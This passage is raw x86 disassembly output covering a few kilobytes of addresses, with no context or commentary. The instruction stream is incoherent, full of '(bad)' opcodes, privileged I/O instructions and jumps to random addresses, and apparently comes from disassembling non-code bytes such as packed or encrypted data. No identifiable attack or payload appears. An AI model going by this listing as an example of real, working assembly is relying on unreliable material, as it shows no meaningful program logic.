  4087dc:	idiv   DWORD PTR [ebx-0x1a]
  4087df:	pop    es
  4087e0:	cs mov ebx,0xddf0e292
  4087e6:	imul   esi,DWORD PTR [edi-0x4f],0x63
  4087ea:	mov    DWORD PTR [edx+0x4d03992a],ebp
  4087f0:	cld    
  4087f1:	mov    bh,0x9e
  4087f3:	test   eax,0x308ed255
  4087f8:	out    0x9f,al
  4087fa:	xchg   BYTE PTR [edi-0x28bbcb64],bh
  408800:	shl    esp,0x60
  408803:	addr16 iret 
  408805:	je     0x408807
  408807:	jmp    0xcff1ef42
  40880c:	movsx  edi,WORD PTR [eax-0x2aabde49]
  408813:	mov    esp,0xdca5c594
  408818:	inc    edi
  408819:	sub    eax,DWORD PTR [edi-0x40acb68c]
  40881f:	(bad)  
  408820:	loopne 0x408898
  408822:	mov    DWORD PTR [edx],eax
  408824:	scas   eax,DWORD PTR es:[edi]
  408825:	mov    WORD PTR [edi-0x24],fs
  408828:	lock scas al,BYTE PTR es:[edi]
  40882a:	jl     0x4087e9
  40882c:	mov    bl,0x8a
  40882e:	fadd   QWORD PTR [esi-0x50945f1]
  408834:	sbb    DWORD PTR [edx],edi
  408836:	xchg   ebx,eax
  408837:	inc    ebx
  408838:	lods   al,BYTE PTR ds:[esi]
  408839:	shl    BYTE PTR [eax-0x63],cl
  40883c:	pop    eax
  40883d:	shl    ch,0xea
  408840:	mov    esi,0xffceb971
  408845:	jg     0x408844
  408847:	mov    bh,bh
  408849:	mov    al,0x63
  40884b:	lahf   
  40884c:	(bad)  
  40884d:	mov    dl,0xa5
  40884f:	fdiv   QWORD PTR [edi]
  408851:	pusha  
  408852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408853:	adc    edi,DWORD PTR [edi+0x2a0296fb]
  408859:	xor    ecx,esi
  40885b:	fs es jns 0x4088cd
  40885f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408860:	and    eax,0x45366f99
  408865:	add    esi,DWORD PTR ds:0x2e10f73d
  40886b:	out    dx,al
  40886c:	cmp    ebp,eax
  40886e:	lahf   
  40886f:	adc    BYTE PTR [ecx],dh
  408871:	jne    0x40884f
  408873:	cli    
  408874:	(bad)  
  408875:	adc    eax,0x3e95ce8d
  40887a:	dec    edx
  40887b:	cmc    
  40887c:	call   0x66524728
  408881:	and    bh,cl
  408883:	imul   esp,DWORD PTR [ecx],0xb497b9aa
  408889:	das    
  40888a:	(bad)  
  40888b:	(bad)  
  40888d:	xor    ah,0xea
  408890:	push   0xffffff8f
  408892:	(bad)  
  408893:	mov    eax,ds:0x306c313e
  408898:	ret    0xb980
  40889b:	push   ecx
  40889c:	pushf  
  40889d:	mov    tr6,eax
  4088a0:	and    al,BYTE PTR [ebx]
  4088a2:	dec    eax
  4088a3:	mov    eax,ds:0x3ac25343
  4088a8:	jmp    0x50972a00
  4088ad:	int3   
  4088ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088af:	mov    DWORD PTR [bx+si],0x6f662ba2
  4088b6:	enter  0xf67b,0x15
  4088ba:	adc    bl,bl
  4088bc:	mov    al,bh
  4088be:	jnp    0x408874
  4088c0:	mov    ebp,0xe628925f
  4088c5:	and    eax,DWORD PTR [edi+0x12f6efba]
  4088cb:	inc    edi
  4088cc:	jnp    0x408876
  4088ce:	retf   
  4088cf:	mov    dl,0xeb
  4088d1:	mov    eax,ds:0x472cfb19
  4088d6:	pop    eax
  4088d7:	jb     0x4088fe
  4088d9:	adc    al,BYTE PTR gs:[edi]
  4088dc:	call   DWORD PTR [edx]
  4088de:	(bad)  
  4088df:	aas    
  4088e0:	pop    eax
  4088e1:	sbb    ebx,0x65
  4088e4:	push   esp
  4088e5:	pop    ebx
  4088e6:	adc    BYTE PTR [edx+eiz*4-0x4f],dl
  4088ea:	cmp    BYTE PTR ds:0xac8931fc,ch
  4088f0:	push   es
  4088f1:	pusha  
  4088f2:	lea    edi,[esi]
  4088f4:	push   es
  4088f5:	imul   ebx,DWORD PTR [eax-0x3b],0x3f
  4088f9:	fbstp  TBYTE PTR [ebx+0x141ecba3]
  4088ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408900:	sbb    al,bl
  408902:	test   DWORD PTR [ebp+0x13],esi
  408905:	(bad)  
  408906:	std    
  408907:	or     BYTE PTR [esi-0x7e],dh
  40890a:	inc    edi
  40890b:	push   0x11
  40890d:	retf   0xb49a
  408910:	pusha  
  408911:	mov    eax,0xf0e1959f
  408916:	repnz cwde 
  408918:	xchg   BYTE PTR ss:[ebx-0x7b15dc9f],bl
  40891f:	or     eax,0x5c1f98ef
  408924:	call   0xdd13efa0
  408929:	add    DWORD PTR [eax],eax
  40892b:	pop    ebx
  40892c:	adc    al,bh
  40892e:	sbb    bh,ch
  408930:	enter  0x564e,0xf1
  408934:	sub    al,0xc
  408936:	or     edi,DWORD PTR [eax-0x55]
  408939:	int3   
  40893a:	(bad)  
  40893b:	fbld   TBYTE PTR es:[edi-0x30]
  40893f:	push   eax
  408940:	mov    esi,0x79639f3d
  408945:	and    al,0xed
  408947:	das    
  408948:	mov    ds,edi
  40894a:	iret   
  40894b:	ret    0x833f
  40894e:	adc    al,0x9f
  408950:	cwde   
  408951:	cld    
  408952:	jne    0x408980
  408954:	rcl    DWORD PTR [eax-0x1a803cf3],cl
  40895a:	leave  
  40895b:	or     bl,BYTE PTR [ebx+0x74684767]
  408961:	add    al,0xac
  408963:	cli    
  408964:	test   al,0x33
  408966:	and    eax,0xd73f276e
  40896b:	mov    ah,0x96
  40896d:	and    BYTE PTR [ebp+ebx*4-0x2c],0x60
  408972:	mov    bl,0x95
  408974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408975:	adc    ebx,DWORD PTR [eax+eax*4]
  408978:	cwde   
  408979:	mov    eax,ds:0xe2e3bd11
  40897e:	jnp    0x4089b6
  408980:	pop    ebp
  408981:	pop    ebx
  408982:	jl     0x408932
  408984:	ins    DWORD PTR es:[edi],dx
  408985:	xchg   ebp,eax
  408986:	jg     0x40892a
  408988:	mov    BYTE PTR [ebx],dl
  40898a:	leave  
  40898b:	sub    esp,DWORD PTR [ebx-0x45]
  40898e:	aas    
  40898f:	ss repz mov cl,0xeb
  408993:	mov    ah,0xc8
  408995:	sub    dh,BYTE PTR gs:[edx-0x6e]
  408999:	clc    
  40899a:	push   edx
  40899b:	stc    
  40899c:	push   0x161d2c89
  4089a1:	jmp    0x408962
  4089a3:	push   edx
  4089a4:	scas   al,BYTE PTR es:[edi]
  4089a5:	mov    eax,ds:0xff1d88b0
  4089aa:	shr    BYTE PTR [esi+0x4fbaa3f6],cl
  4089b0:	dec    esp
  4089b1:	retf   0xd224
  4089b4:	stos   DWORD PTR es:[edi],eax
  4089b5:	or     eax,0x857a7fa8
  4089ba:	stos   BYTE PTR es:[edi],al
  4089bb:	push   es
  4089bc:	(bad)  
  4089bd:	rcr    BYTE PTR [ecx-0x66],1
  4089c0:	mov    ds,WORD PTR ds:0xe7d75145
  4089c6:	mov    edx,0x7bbe6dd6
  4089cb:	int    0x78
  4089cd:	add    cl,BYTE PTR [ebx]
  4089cf:	push   ebx
  4089d0:	test   eax,0x1d10f3ea
  4089d5:	sbb    ch,BYTE PTR [edi-0x4d]
  4089d8:	add    DWORD PTR [edx+0x2001734c],esp
  4089de:	add    ah,BYTE PTR [edx]
  4089e0:	leave  
  4089e1:	jns    0x4089f0
  4089e3:	xchg   edi,eax
  4089e4:	add    ch,BYTE PTR [edx]
  4089e6:	add    BYTE PTR [esi],ch
  4089e8:	cmp    BYTE PTR [ecx],0xd0
  4089eb:	sub    eax,0x390f663
  4089f0:	and    esp,DWORD PTR [ebx-0x4a]
  4089f3:	mov    al,0xae
  4089f5:	ret    0x19ea
  4089f8:	mov    cl,0xba
  4089fa:	(bad)  
  4089fb:	and    DWORD PTR [ecx],edx
  4089fd:	fsubr  QWORD PTR [ecx+0x41c3e059]
  408a03:	dec    esi
  408a04:	das    
  408a05:	hlt    
  408a06:	push   ebp
  408a07:	in     eax,0x6a
  408a09:	sbb    al,dl
  408a0b:	jbe    0x408a88
  408a0d:	sub    bl,ah
  408a0f:	addr16 pop es
  408a11:	or     edi,edx
  408a13:	les    edx,FWORD PTR [esp+edx*1+0x61a67357]
  408a1a:	inc    edi
  408a1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a1c:	(bad)  
  408a20:	push   edx
  408a21:	or     edi,DWORD PTR [edx+0xb4efddb]
  408a27:	xchg   ecx,eax
  408a28:	mov    esp,0x3c0d7909
  408a2d:	loopne 0x408aa4
  408a2f:	jne    0x408a06
  408a31:	out    dx,al
  408a32:	scas   al,BYTE PTR es:[edi]
  408a33:	(bad)  
  408a34:	xor    eax,0x3bffaaac
  408a39:	push   ebx
  408a3a:	pop    ds
  408a3b:	nop
  408a3c:	sub    eax,DWORD PTR [ebp+0x7a352185]
  408a42:	add    al,0x4a
  408a44:	dec    eax
  408a45:	scas   eax,DWORD PTR es:[edi]
  408a46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a47:	add    DWORD PTR [ebx],ebx
  408a49:	cmp    BYTE PTR [esi+ebx*8-0x19],0xc3
  408a4e:	fld    QWORD PTR [edi+edx*4+0x53da0c91]
  408a55:	lds    esi,FWORD PTR [ebx-0x7424f5d1]
  408a5b:	ss mov esi,?
  408a5e:	sti    
  408a5f:	sub    DWORD PTR [eax+0xb76dd83],esp
  408a65:	out    0x95,eax
  408a67:	call   0x85c8:0xcd19e911
  408a6e:	pop    ds
  408a6f:	inc    edx
  408a70:	out    0xc9,al
  408a72:	sub    BYTE PTR [eax-0x17472266],0x56
  408a79:	jmp    0x1242:0x1d779046
  408a80:	aas    
  408a81:	fwait
  408a82:	dec    ebx
  408a83:	ror    ecx,1
  408a85:	enter  0x613d,0x92
  408a89:	jge    0x408a82
  408a8b:	sub    bh,dl
  408a8d:	bswap  esp
  408a8f:	jb     0x408a63
  408a91:	sbb    dh,BYTE PTR [ebp+0x64]
  408a94:	test   BYTE PTR [eax],dh
  408a96:	add    al,BYTE PTR [esi-0x76]
  408a99:	jp     0x408a29
  408a9b:	enter  0x2191,0xf9
  408a9f:	ja     0x408a56
  408aa1:	adc    BYTE PTR ds:0x2d31a642,bh
  408aa7:	jb     0x381e305
  408aad:	cmp    DWORD PTR [ecx-0x63],esi
  408ab0:	icebp  
  408ab1:	into   
  408ab2:	add    eax,0x44a02c8f
  408ab7:	mov    DWORD PTR [edi],ecx
  408ab9:	jno    0x408af9
  408abb:	jge    0x408a6e
  408abd:	aaa    
  408abe:	mov    al,0x95
  408ac0:	pop    ebp
  408ac1:	add    eax,0x82020513
  408ac6:	arpl   WORD PTR [esi-0x6e],si
  408ac9:	mov    cl,0x24
  408acb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408acc:	lods   al,BYTE PTR ds:[esi]
  408acd:	add    ecx,DWORD PTR [ebx+0x6e9a9a8a]
  408ad3:	xchg   edi,eax
  408ad4:	mov    eax,ds:0x873cb7c9
  408ad9:	enter  0xa878,0x62
  408add:	or     ch,BYTE PTR [eax+0x3b]
  408ae0:	or     al,0xdd
  408ae2:	jge    0x408ab9
  408ae4:	xor    dh,BYTE PTR [edi+edi*2-0x1a]
  408ae8:	out    dx,eax
  408ae9:	std    
  408aea:	mov    es,eax
  408aec:	add    eax,DWORD PTR [esi-0x16b1140e]
  408af2:	pushf  
  408af3:	into   
  408af4:	std    
  408af5:	mov    ch,0x8a
  408af7:	sbb    eax,0x328d430f
  408afc:	ja     0x408a96
  408afe:	push   edi
  408aff:	je     0x408acf
  408b01:	inc    ecx
  408b02:	pop    edi
  408b03:	cmp    bl,BYTE PTR [esi+0x74778f49]
  408b09:	inc    edi
  408b0a:	sub    ah,BYTE PTR [esi]
  408b0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b0d:	cmc    
  408b0e:	aaa    
  408b0f:	jmp    FWORD PTR [ebp+edi*4+0x6c73c35b]
  408b16:	sbb    eax,edx
  408b18:	pop    ss
  408b19:	pop    ebx
  408b1a:	lds    ebp,FWORD PTR [esi+0xe05c131]
  408b20:	xor    ebx,edi
  408b22:	into   
  408b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b24:	bound  ecx,QWORD PTR [edx]
  408b26:	ds enter 0xbeba,0xcd
  408b2b:	mov    bh,0x0
  408b2d:	push   0xffffffc0
  408b2f:	fmul   st,st(1)
  408b31:	rcr    BYTE PTR [edx-0x16],0xa
  408b35:	cmp    bl,BYTE PTR [edi+eiz*2+0x39]
  408b39:	xchg   edi,eax
  408b3a:	sbb    DWORD PTR [edx],ebx
  408b3c:	int3   
  408b3d:	nop
  408b3e:	(bad)  
  408b3f:	mov    eax,0xd6424999
  408b44:	aaa    
  408b45:	mov    edi,0x696875de
  408b4a:	sar    esp,0xfa
  408b4d:	hlt    
  408b4e:	xchg   esp,eax
  408b4f:	addr16 xchg edi,eax
  408b51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b52:	test   ebx,0x62f8430a
  408b58:	mov    ch,bl
  408b5a:	(bad)  
  408b5b:	repz cli 
  408b5d:	and    DWORD PTR [ebx],0xad0b81ce
  408b63:	pop    ebp
  408b64:	xchg   DWORD PTR [eax+0x13235bb],ebp
  408b6a:	adc    ch,BYTE PTR [ecx-0x596207da]
  408b70:	ficom  WORD PTR [ebp-0x2b3c3e4c]
  408b76:	iret   
  408b77:	repz pop eax
  408b79:	rep stos BYTE PTR es:[edi],al
  408b7b:	cmp    esp,DWORD PTR [ebp+0x787e0ba0]
  408b81:	mov    dh,0x9b
  408b83:	mov    ah,0xc0
  408b85:	and    eax,0x87efa0a6
  408b8a:	mov    ds:0xa9351f0d,eax
  408b8f:	arpl   WORD PTR [edi],si
  408b91:	ret    0x5f1a
  408b94:	cmc    
  408b95:	hlt    
  408b96:	adc    BYTE PTR [edi-0x4a],bh
  408b99:	hlt    
  408b9a:	jp     0x408b4d
  408b9c:	rcr    BYTE PTR [edx+0x43],cl
  408b9f:	cli    
  408ba0:	sbb    esp,DWORD PTR [eax-0x14]
  408ba3:	popa   
  408ba4:	jns    0x408c07
  408ba6:	and    bh,0xd6
  408ba9:	mov    ebx,0xd5abf5ff
  408bae:	push   ecx
  408baf:	rcl    DWORD PTR [eax],0x74
  408bb2:	pop    ss
  408bb3:	ret    0x2b7f
  408bb6:	add    eax,0xfc64f17
  408bbb:	sub    edx,DWORD PTR [ebx]
  408bbd:	ja     0x408b94
  408bbf:	hlt    
  408bc0:	or     eax,0xa0265716
  408bc5:	jno    0x408b83
  408bc7:	sti    
  408bc8:	fnstenv es:[edi]
  408bcb:	add    BYTE PTR [ecx+edi*2-0x44],0x2
  408bd0:	mov    bl,0x6
  408bd2:	stos   DWORD PTR es:[edi],eax
  408bd3:	pop    ecx
  408bd4:	push   ebp
  408bd5:	dec    edi
  408bd6:	int3   
  408bd7:	cmc    
  408bd8:	push   ecx
  408bd9:	imul   edi,edi,0x2
  408bdc:	fisttp QWORD PTR [edi+0x878f2d7]
  408be2:	outs   dx,BYTE PTR ds:[esi]
  408be3:	fwait
  408be4:	jecxz  0x408bef
  408be6:	mov    edx,0x6c8d225
  408beb:	inc    ecx
  408bec:	add    eax,0x7399d0f3
  408bf1:	or     al,0x8a
  408bf3:	push   ebx
  408bf4:	outs   dx,BYTE PTR ds:[esi]
  408bf5:	bound  ebx,QWORD PTR [ebp+0x0]
  408bf8:	and    al,0xe7
  408bfa:	mov    fs,WORD PTR [ecx+0x63b0d64c]
  408c00:	dec    esp
  408c01:	jbe    0x408c60
  408c03:	xlat   BYTE PTR ds:[ebx]
  408c04:	shl    DWORD PTR [ecx],1
  408c06:	xlat   BYTE PTR ds:[ebx]
  408c07:	aam    0xcb
  408c09:	iret   
  408c0a:	scas   al,BYTE PTR es:[edi]
  408c0b:	int3   
  408c0c:	pop    ebp
  408c0d:	xlat   BYTE PTR ds:[ebx]
  408c0e:	sub    al,BYTE PTR [ebp+0x46]
  408c11:	fxch   st(4)
  408c13:	out    dx,al
  408c14:	or     DWORD PTR [ebx+0x37],edi
  408c17:	and    eax,ecx
  408c19:	jne    0x408bc4
  408c1b:	jmp    0x408bf2
  408c1d:	outs   dx,BYTE PTR ds:[esi]
  408c1e:	sahf   
  408c1f:	lds    edi,FWORD PTR [esp+ebx*8-0x3fdc167e]
  408c26:	xchg   DWORD PTR [edx],ebp
  408c28:	mov    bh,0xab
  408c2a:	mov    bl,0xd2
  408c2c:	bound  ecx,QWORD PTR ds:0x878f6f7a
  408c32:	imul   ebp,edx,0x4ff48e0a
  408c38:	ss inc edx
  408c3a:	mov    esp,0xaa3c994a
  408c3f:	sbb    al,0xcd
  408c41:	shl    BYTE PTR [edx],1
  408c43:	rcl    BYTE PTR [ecx],0xbf
  408c46:	nop
  408c47:	cmp    DWORD PTR [edi+0x7342d3ca],esi
  408c4d:	push   ecx
  408c4e:	jnp    0x408caa
  408c50:	bound  edx,QWORD PTR [esi]
  408c52:	sbb    DWORD PTR [edi-0x5183cfc2],esp
  408c58:	ins    DWORD PTR es:[edi],dx
  408c59:	lods   eax,DWORD PTR ds:[esi]
  408c5a:	inc    ebx
  408c5b:	push   esp
  408c5c:	aaa    
  408c5d:	jb     0x408c14
  408c5f:	cli    
  408c60:	add    al,0xb2
  408c62:	lds    esp,FWORD PTR cs:[edx+0x62]
  408c66:	stc    
  408c67:	jnp    0x408cd2
  408c69:	inc    edi
  408c6a:	arpl   WORD PTR [eax+ebx*4],si
  408c6d:	addr16 out dx,eax
  408c6f:	add    eax,0xee452b56
  408c74:	sub    DWORD PTR [ecx-0xd],ebx
  408c77:	inc    edi
  408c78:	retf   0x8328
  408c7b:	int    0x7f
  408c7d:	xchg   esp,eax
  408c7e:	pop    esi
  408c7f:	sub    BYTE PTR [ebx],0x26
  408c82:	jmp    0x408cf8
  408c84:	mul    DWORD PTR [ebp-0x10]
  408c87:	stc    
  408c88:	xor    edi,DWORD PTR [ecx]
  408c8a:	sub    bl,BYTE PTR [edi+ecx*4-0x23]
  408c8e:	test   eax,0x5bf2fe16
  408c93:	inc    eax
  408c94:	loopne 0x408c83
  408c96:	inc    ebx
  408c97:	sub    al,0x68
  408c99:	je     0x408c42
  408c9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c9c:	xor    edi,edx
  408c9e:	in     al,dx
  408c9f:	mov    ecx,0xcc896d94
  408ca4:	cdq    
  408ca5:	js     0x408cd5
  408ca7:	sub    eax,0x9ff9b561
  408cac:	or     eax,0x830e4b8e
  408cb1:	inc    eax
  408cb2:	pop    esp
  408cb3:	cmp    bl,ah
  408cb5:	pop    edi
  408cb6:	or     DWORD PTR [ecx+0x422d8630],0xb8fd790b
  408cc0:	and    al,0x56
  408cc2:	add    eax,0xef3999ba
  408cc7:	adc    al,dh
  408cc9:	xor    DWORD PTR [edi-0x3d],0x9013ed1e
  408cd0:	icebp  
  408cd1:	push   esi
  408cd2:	mov    edi,0x4e9319c
  408cd7:	dec    esp
  408cd8:	dec    eax
  408cd9:	imul   ebx,DWORD PTR [edx+0x675b5a61],0x98898c94
  408ce3:	test   cl,ah
  408ce5:	xor    ebp,DWORD PTR [edi+ecx*1+0x2d]
  408ce9:	mov    al,ds:0x4e2e88aa
  408cee:	and    BYTE PTR [ebx-0x191d5889],ch
  408cf4:	pushf  
  408cf5:	adc    ah,BYTE PTR ss:[ecx+eiz*8]
  408cf9:	icebp  
  408cfa:	mov    bl,ah
  408cfc:	ins    DWORD PTR es:[edi],dx
  408cfd:	test   dh,ah
  408cff:	xchg   esi,eax
  408d00:	sti    
  408d01:	adc    eax,0xc60426d0
  408d06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d07:	push   esp
  408d08:	xchg   edi,eax
  408d09:	stos   DWORD PTR es:[edi],eax
  408d0a:	fwait
  408d0b:	jne    0x408d35
  408d0d:	nop
  408d0e:	xor    BYTE PTR [ebp-0xfe5a034],bh
  408d14:	mov    DWORD PTR [eax+0x43],edx
  408d17:	cmp    al,BYTE PTR [edx]
  408d19:	jnp    0x408ca4
  408d1b:	ficomp DWORD PTR [esp+esi*1+0x23c66b31]
  408d22:	lock fld st(2)
  408d25:	nop
  408d26:	popf   
  408d27:	mul    BYTE PTR [esi+ebp*2]
  408d2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d2b:	cmc    
  408d2c:	mov    DWORD PTR [edx+0x31f6930e],ebp
  408d32:	ror    ecx,1
  408d34:	xchg   ebp,eax
  408d35:	fisttp WORD PTR [edx+0x7b93dd66]
  408d3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d3c:	outs   dx,DWORD PTR ds:[esi]
  408d3d:	push   edx
  408d3e:	cdq    
  408d3f:	and    edx,DWORD PTR [eax]
  408d41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d42:	js     0x408cc6
  408d44:	out    dx,eax
  408d45:	test   DWORD PTR [ecx-0x75f42ea9],edx
  408d4b:	dec    ebp
  408d4c:	stc    
  408d4d:	sub    ecx,edi
  408d4f:	test   BYTE PTR [ebp+ebp*1+0x48647869],0x2c
  408d57:	aas    
  408d58:	or     BYTE PTR [edx+0x63],cl
  408d5b:	(bad)  
  408d5c:	sbb    al,0x49
  408d5e:	std    
  408d5f:	clc    
  408d60:	sub    BYTE PTR [esi-0x37],ch
  408d63:	xchg   edx,eax
  408d64:	mov    bl,0x84
  408d66:	in     eax,0xa1
  408d68:	(bad)  
  408d69:	fsub   DWORD PTR [eax-0x3e7589b1]
  408d6f:	jae    0x408d15
  408d71:	out    dx,al
  408d72:	inc    eax
  408d73:	mov    ds:0xce059831,eax
  408d78:	sar    BYTE PTR [edi-0x247ef011],cl
  408d7e:	neg    DWORD PTR [edi-0x76]
  408d81:	jle    0x408d5f
  408d83:	std    
  408d84:	sbb    ebp,ebx
  408d86:	inc    esp
  408d87:	jmp    0x408d80
  408d89:	pop    eax
  408d8a:	(bad)  
  408d8b:	retf   0x7486
  408d8e:	stc    
  408d8f:	cli    
  408d90:	and    al,0x91
  408d92:	cmp    DWORD PTR [esi+ebx*2],edi
  408d95:	jle    0x408d22
  408d97:	stc    
  408d98:	sub    DWORD PTR [ebx+0x57],0xb1bedbe
  408d9f:	ret    0x4232
  408da2:	mov    dh,0xc
  408da4:	pop    ss
  408da5:	dec    edi
  408da6:	ss inc edi
  408da8:	aad    0xe1
  408daa:	add    esp,DWORD PTR [ebp-0x42]
  408dad:	popf   
  408dae:	pop    eax
  408daf:	mov    ebp,0x5b93653a
  408db4:	int3   
  408db5:	adc    DWORD PTR [ebx-0x4451a26f],eax
  408dbb:	mov    dh,0x28
  408dbd:	and    ch,BYTE PTR [esi+ebp*8+0x4a]
  408dc1:	sbb    BYTE PTR [esp+edx*1-0x7],ah
  408dc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dc6:	jl     0x408d62
  408dc8:	add    al,0x24
  408dca:	ss es jne 0x408db8
  408dce:	pop    ebx
  408dcf:	jg     0x408da6
  408dd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408dd2:	in     eax,dx
  408dd3:	mov    cl,0x8b
  408dd5:	stos   DWORD PTR es:[edi],eax
  408dd6:	mov    ds:0x4cd558e4,al
  408ddb:	jle    0x408dbe
  408ddd:	dec    eax
  408dde:	adc    al,0xb2
  408de0:	push   ss
  408de1:	mov    ch,0xa7
  408de3:	push   0xb7e69bb5
  408de8:	mov    dl,0xc4
  408dea:	ins    DWORD PTR es:[edi],dx
  408deb:	retf   0xe41d
  408dee:	jne    0x408e48
  408df0:	outs   dx,DWORD PTR ds:[esi]
  408df1:	ins    BYTE PTR es:[edi],dx
  408df2:	dec    ecx
  408df3:	gs repz pop es
  408df6:	jg     0x408d9e
  408df8:	ret    
  408df9:	inc    ebx
  408dfa:	outs   dx,BYTE PTR ds:[esi]
  408dfb:	xchg   edx,eax
  408dfc:	add    esi,eax
  408dfe:	adc    ah,dh
  408e00:	mov    cl,0x74
  408e02:	addr16 pop ds
  408e04:	popf   
  408e05:	add    al,0x5a
  408e07:	cmc    
  408e08:	or     BYTE PTR [edx+edx*1],bl
  408e0b:	jmp    0x408e1c
  408e0d:	sub    al,0xd0
  408e0f:	sbb    al,0x45
  408e11:	mov    esp,0xc02f1f6e
  408e16:	dec    esp
  408e17:	push   0x804bac50
  408e1c:	push   edx
  408e1d:	jb     0x408dbd
  408e1f:	js     0x408e8e
  408e21:	lds    ebp,FWORD PTR [eax+0x6c6df6d6]
  408e27:	pop    ebx
  408e28:	pop    esp
  408e29:	daa    
  408e2a:	cmp    eax,0xa78c8c5b
  408e2f:	scas   al,BYTE PTR es:[edi]
  408e30:	mov    edi,0x128c61ee
  408e35:	cdq    
  408e36:	push   ebp
  408e37:	inc    edx
  408e38:	or     DWORD PTR [eax],esi
  408e3a:	outs   dx,BYTE PTR ds:[esi]
  408e3b:	out    0x22,eax
  408e3d:	xchg   esp,eax
  408e3e:	cs dec ecx
  408e40:	sub    eax,0x35929bc3
  408e45:	xchg   esp,eax
  408e46:	inc    DWORD PTR [edx]
  408e48:	popf   
  408e49:	pushf  
  408e4a:	pop    edx
  408e4b:	sbb    cl,BYTE PTR [bp+di+0x6b]
  408e4f:	ds cmp ah,dl
  408e52:	mov    DWORD PTR [edi],esi
  408e54:	fist   WORD PTR [ebx+0x1c7f81bc]
  408e5a:	sub    cl,al
  408e5c:	fwait
  408e5d:	in     al,0xd
  408e5f:	adc    bh,BYTE PTR [eax+0x51d6b78e]
  408e65:	mov    edi,0x2f1b56d
  408e6a:	clc    
  408e6b:	fsubr  QWORD PTR [ebx-0x53]
  408e6e:	ss dec esi
  408e70:	push   ebx
  408e71:	or     al,0x3e
  408e73:	adc    BYTE PTR [esi+0x392e3da7],dl
  408e79:	push   ebp
  408e7a:	push   0x6c
  408e7c:	call   0xf8e7357a
  408e81:	mov    ecx,0x3bfaf2c6
  408e86:	out    dx,al
  408e87:	adc    ebp,DWORD PTR [esi]
  408e89:	ins    BYTE PTR es:[edi],dx
  408e8a:	xor    al,0xfe
  408e8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e8d:	fcmovne st,st(7)
  408e8f:	or     eax,DWORD PTR [edi+0x17b917e3]
  408e95:	inc    edi
  408e96:	add    al,0x90
  408e98:	dec    eax
  408e99:	popa   
  408e9a:	lock mov ch,0x55
  408e9d:	dec    eax
  408e9e:	call   0x7ee6b88
  408ea3:	pop    ds
  408ea4:	mov    edx,0xd58cdf7a
  408ea9:	pop    es
  408eaa:	pop    esi
  408eab:	xchg   edi,eax
  408eac:	cwde   
  408ead:	xchg   edx,eax
  408eae:	mov    WORD PTR [eax+0x2],?
  408eb1:	cwde   
  408eb2:	push   0x3dbc02e1
  408eb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408eb8:	mov    esp,0x22c25c6c
  408ebd:	cmp    eax,0x15006cd6
  408ec2:	aam    0xa4
  408ec4:	xor    ebx,DWORD PTR [ebx+ecx*2]
  408ec7:	or     DWORD PTR [ecx],edi
  408ec9:	dec    ebp
  408eca:	cli    
  408ecb:	add    al,0x68
  408ecd:	ins    DWORD PTR es:[edi],dx
  408ece:	xchg   esp,eax
  408ecf:	sbb    ebp,DWORD PTR [ebx+0x4a]
  408ed2:	sub    BYTE PTR [ebp+0x1ccde5e2],bl
  408ed8:	pop    esi
  408ed9:	or     DWORD PTR [ebx],ebp
  408edb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408edc:	es mov bl,0x5a
  408edf:	outs   dx,BYTE PTR ds:[esi]
  408ee0:	(bad)  
  408ee1:	stos   DWORD PTR es:[edi],eax
  408ee2:	(bad)  
  408ee3:	enter  0x8c61,0xc6
  408ee7:	mov    ds:0x1d480f8,al
  408eec:	xor    DWORD PTR ds:0x1e407434,edx
  408ef2:	sbb    al,0x16
  408ef4:	push   es
  408ef5:	push   sp
  408ef7:	outs   dx,BYTE PTR ds:[esi]
  408ef8:	call   0x42d3:0xb3329b34
  408eff:	into   
  408f00:	add    BYTE PTR [ebx-0x7b8b558c],bl
  408f06:	in     eax,0x14
  408f08:	data16 ins BYTE PTR es:[edi],dx
  408f0a:	test   al,0xae
  408f0c:	popf   
  408f0d:	pushf  
  408f0e:	inc    ecx
  408f0f:	out    0xf9,al
  408f11:	(bad)  
  408f12:	sbb    eax,0x2a809c8b
  408f17:	(bad)  
  408f18:	jecxz  0x408f0d
  408f1a:	pop    ebx
  408f1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f1c:	call   ebx
  408f1e:	jnp    0x408ea0
  408f20:	adc    DWORD PTR [edi-0x36f0f883],esp
  408f26:	enter  0x722d,0xdd
  408f2a:	lea    ebx,[esi]
  408f2c:	hlt    
  408f2d:	je     0x408f97
  408f2f:	jmp    0x408ec6
  408f31:	mov    WORD PTR [ebp-0x1f],ss
  408f34:	popa   
  408f35:	inc    ebp
  408f36:	jmp    0xb217:0x3890f73f
  408f3d:	xchg   ebx,eax
  408f3e:	imul   edi,DWORD PTR [edx-0x140744b1],0x77
  408f45:	adc    ecx,0x866fc204
  408f4b:	fidiv  DWORD PTR [ecx]
  408f4d:	ins    BYTE PTR es:[edi],dx
  408f4e:	cmp    DWORD PTR [edx+0x4630ba14],ebx
  408f54:	ret    0x5b83
  408f57:	pushf  
  408f58:	(bad)  
  408f59:	fnsave [eax+edi*2]
  408f5c:	shl    DWORD PTR [eax],0x41
  408f5f:	adc    al,BYTE PTR [eax+0x4ec43f35]
  408f65:	int    0xb1
  408f67:	into   
  408f68:	pop    eax
